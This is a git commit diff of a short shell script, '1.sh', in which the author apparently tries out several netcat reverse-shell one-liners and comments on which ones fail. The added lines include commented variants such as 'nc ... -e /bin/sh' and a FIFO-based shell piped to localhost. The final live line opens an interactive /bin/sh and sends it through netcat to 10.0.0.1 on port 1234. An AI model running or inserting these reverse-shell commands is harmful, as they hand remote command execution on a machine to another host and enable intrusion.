ce09195cf4a92674602cee9ea8b102336d567396
fly2maybe <txmxidian@gmail.com>
2017-08-14 20:11:25 +0800

    Update 1.sh

--- 1.sh
+++ 1.sh
@@ -1,5 +1,14 @@
 touch HelloWorld
+
+#work
 #rm /tmp/backpipe ; mknod /tmp/backpipe p
 #/bin/sh 0</tmp/backpipe | nc 127.0.0.1 1234 1>/tmp/backpipe&
 
-rm -f /tmp/p; mknod /tmp/p p && nc 127.0.0.1 1234 0/tmp/p
+#don't work --- nc: invalid option -- 'e'
+#nc 127.0.0.1 2222 -e "/bin/sh"&
+
+#don't work --- nc: getaddrinfo: Servname not supported for ai_socktype
+#rm -f /tmp/p; mknod /tmp/p p && nc 127.0.0.1 1234 0/tmp/p
+
+#don't work --- nc: Address already in use
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
